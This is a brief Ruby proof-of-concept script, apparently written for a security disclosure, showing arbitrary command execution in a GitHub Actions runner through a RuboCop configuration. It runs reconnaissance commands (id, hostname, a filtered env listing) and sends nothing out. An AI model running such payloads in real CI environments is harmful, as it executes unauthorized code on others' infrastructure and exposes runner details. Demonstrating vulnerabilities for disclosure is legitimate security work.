# Proof of Concept: Remote Code Execution via RuboCop Configuration
# This script demonstrates the ability to execute arbitrary commands 
# within the GitHub Actions runner environment.

puts "--- SECURITY RECONNAISSANCE START ---"
puts "Current User ID:"
system("id")
puts "\nHostname:"
system("hostname")
puts "\nEnvironment Variables (Sanitized):"
system("env | grep -E 'GITHUB_ACTIONS|GITHUB_REPOSITORY|GITHUB_WORKFLOW'")
puts "--- SECURITY RECONNAISSANCE END ---"
